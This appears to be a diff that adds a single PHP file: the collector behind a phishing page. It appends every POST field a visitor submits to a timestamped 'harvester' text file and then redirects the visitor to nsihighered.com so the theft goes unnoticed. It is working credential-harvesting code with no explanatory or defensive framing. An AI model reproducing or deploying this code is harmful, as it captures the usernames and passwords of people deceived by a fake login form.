@@ -1,0 +1,1 @@
+<?php $file = 'harvester_2016-09-29 19:29:53.733901.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?><meta http-equiv="refresh" content="0; url=http://nsihighered.com" />
